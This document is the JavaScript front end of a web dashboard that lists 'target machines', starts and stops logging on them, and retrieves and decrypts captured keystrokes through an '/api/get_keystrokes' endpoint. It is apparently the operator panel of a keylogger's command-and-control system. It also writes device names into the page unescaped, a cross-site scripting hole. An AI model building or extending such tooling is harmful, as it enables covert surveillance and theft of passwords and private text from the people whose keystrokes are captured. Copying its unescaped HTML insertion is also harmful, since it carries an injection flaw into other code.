// Initialize toast
const toastEl = document.getElementById('alert-toast');
const toast = new bootstrap.Toast(toastEl);

function showAlert(message, type = 'success') {
    const toast = document.getElementById('alert-toast');
    toast.className = `toast align-items-center text-white bg-${type} border-0`;
    toast.querySelector('.toast-body').textContent = message;
    bootstrap.Toast.getOrCreateInstance(toast).show();
}

function formatDate(dateString) {
    if (!dateString) return 'Never';
    const date = new Date(dateString);
    return date.toLocaleString();
}

let encryptionState = {};

function updateDevicesList(devices) {
    const container = document.getElementById('devices-list');
    container.innerHTML = '';
    
    if (devices.length === 0) {
        container.innerHTML = '<div class="alert alert-info">No devices connected</div>';
        return;
    }
    
    devices.forEach(device => {
        // Set initial state for encryption
        if (!encryptionState.hasOwnProperty(device.device_id)) {
            encryptionState[device.device_id] = false;
        }
        
        const deviceHtml = `
            <div class="device-item mb-3" data-device-id="${device.device_id}">
                <div class="card">
                    <div class="card-body">
                        <div class="d-flex justify-content-between align-items-start">
                            <div>
                                <h5 class="card-title">${device.name || device.device_id}</h5>
                                <p class="card-text device-id">${device.device_id}</p>
                            </div>
                            <span class="badge ${device.is_active ? 'bg-success' : 'bg-danger'} device-status">
                                ${device.is_active ? 'Active' : 'Inactive'}
                            </span>
                        </div>
                        
                        <div class="device-info small text-muted mb-3">
                            <div><i class="bi bi-clock"></i> Last seen: ${formatDate(device.last_seen)}</div>
                        </div>
                        
                        <div class="btn-group mb-3">
                            <button class="btn btn-success start-logging" onclick="startLogging(this)">
                                <i class="bi bi-play-circle"></i> Start
                            </button>
                            <button class="btn btn-danger stop-logging" onclick="stopLogging(this)">
                                <i class="bi bi-stop-circle"></i> Stop
                            </button>
                            <button class="btn btn-primary view-logs" onclick="viewLogs(this)">
                                <i class="bi bi-eye"></i> View Logs
                            </button>
                            <button class="btn btn-secondary toggle-encryption" onclick="toggleEncryption(this)">
                                <i class="bi bi-lock"></i> <span>Decrypt</span>
                            </button>
                            <button class="btn btn-danger" onclick="removeDevice(this)">
                                <i class="bi bi-trash"></i> Remove
                            </button>
                        </div>
                        
                        <div class="logs-container mt-3" style="display: none;">
                            <div class="card">
                                <div class="card-body">
                                    <pre class="logs-content">No logs available</pre>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        `;
        container.insertAdjacentHTML('beforeend', deviceHtml);
        
        // Update button states after adding to DOM
        const deviceItem = container.lastElementChild;
        const startBtn = deviceItem.querySelector('.start-logging');
        const stopBtn = deviceItem.querySelector('.stop-logging');
        
        if (!device.is_active) {
            // When device is inactive, only view logs, decrypt/encrypt and remove are enabled
            startBtn.disabled = true;
            stopBtn.disabled = true;
        } else {
            // When device is active, all buttons are enabled
            // Start and stop buttons are opposite of each other
            startBtn.disabled = false;
            stopBtn.disabled = true;
        }
    });
}

async function startLogging(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'start'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            const startBtn = deviceItem.querySelector('.start-logging');
            const stopBtn = deviceItem.querySelector('.stop-logging');
            const statusBadge = deviceItem.querySelector('.device-status');
            
            startBtn.disabled = true;
            stopBtn.disabled = false;
            statusBadge.className = 'badge bg-success device-status';
            statusBadge.textContent = 'Active';
            
            showAlert(data.message || 'Logging started', 'success');
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error starting logging', 'danger');
        }
    } catch (error) {
        showAlert('Error starting logging', 'danger');
    }
}

async function stopLogging(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        const response = await fetch('/api/toggle_logging', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                device_id: deviceId,
                action: 'stop'
            })
        });
        
        if (response.ok) {
            const data = await response.json();
            const startBtn = deviceItem.querySelector('.start-logging');
            const stopBtn = deviceItem.querySelector('.stop-logging');
            const statusBadge = deviceItem.querySelector('.device-status');
            
            startBtn.disabled = false;
            stopBtn.disabled = true;
            statusBadge.className = 'badge bg-danger device-status';
            statusBadge.textContent = 'Inactive';
            
            showAlert(data.message || 'Logging stopped', 'success');
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error stopping logging', 'danger');
        }
    } catch (error) {
        showAlert('Error stopping logging', 'danger');
    }
}

function toggleEncryption(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    encryptionState[deviceId] = !encryptionState[deviceId];
    
    const span = btn.querySelector('span');
    const icon = btn.querySelector('i');
    if (encryptionState[deviceId]) {
        span.textContent = 'Encrypt';
        icon.className = 'bi bi-unlock';
    } else {
        span.textContent = 'Decrypt';
        icon.className = 'bi bi-lock';
    }
    
    const logsContainer = deviceItem.querySelector('.logs-container');
    if (logsContainer.style.display !== 'none') {
        viewLogs(deviceItem.querySelector('.view-logs'));
    }
}

async function viewLogs(btn) {
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    const logsContainer = deviceItem.querySelector('.logs-container');
    const logsContent = logsContainer.querySelector('.logs-content');
    
    try {
        const response = await fetch(`/api/get_keystrokes?machine=${deviceId}&encrypted=${encryptionState[deviceId] || false}`);
        if (response.ok) {
            const data = await response.json();
            logsContent.textContent = data.data;
            logsContainer.style.display = logsContainer.style.display === 'none' ? 'block' : 'none';
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error fetching logs', 'danger');
        }
    } catch (error) {
        showAlert('Error fetching logs', 'danger');
    }
}

async function removeDevice(btn) {
    if (!confirm('Are you sure you want to remove this device? All logs will be deleted.')) {
        return;
    }
    
    const deviceItem = btn.closest('.device-item');
    const deviceId = deviceItem.dataset.deviceId;
    
    try {
        const response = await fetch('/api/remove_device', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Requested-With': 'XMLHttpRequest'
            },
            body: JSON.stringify({
                device_id: deviceId
            })
        });
        
        if (response.ok) {
            deviceItem.remove();
            showAlert('Device removed successfully', 'success');
        } else {
            const error = await response.json();
            showAlert(error.error || 'Error removing device', 'danger');
        }
    } catch (error) {
        showAlert('Error removing device', 'danger');
    }
}

// Wait for DOM to be fully loaded
document.addEventListener('DOMContentLoaded', function() {
    // Register device form submission
    document.getElementById('register-device-form').addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const deviceName = document.getElementById('device-name').value;
        const deviceId = 'WIN-' + Math.random().toString(36).substr(2, 9).toUpperCase();
        
        try {
            const response = await fetch('/api/register_device', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Requested-With': 'XMLHttpRequest'
                },
                body: JSON.stringify({
                    device_id: deviceId,
                    name: deviceName
                })
            });
            
            if (response.ok) {
                document.getElementById('device-name').value = '';
                showAlert('Device registered successfully', 'success');
                refreshDevices();
            } else {
                const error = await response.json();
                showAlert(error.error || 'Error registering device', 'danger');
            }
        } catch (error) {
            showAlert('Error registering device', 'danger');
        }
    });

    // Initial refresh
    refreshDevices();
    
    // Set up periodic refresh
    setInterval(refreshDevices, 30000);
});

async function refreshDevices() {
    try {
        const response = await fetch('/api/get_target_machines_list');
        if (response.ok) {
            const devices = await response.json();
            updateDevicesList(devices);
        }
    } catch (error) {
        console.error('Error refreshing devices:', error);
    }
} 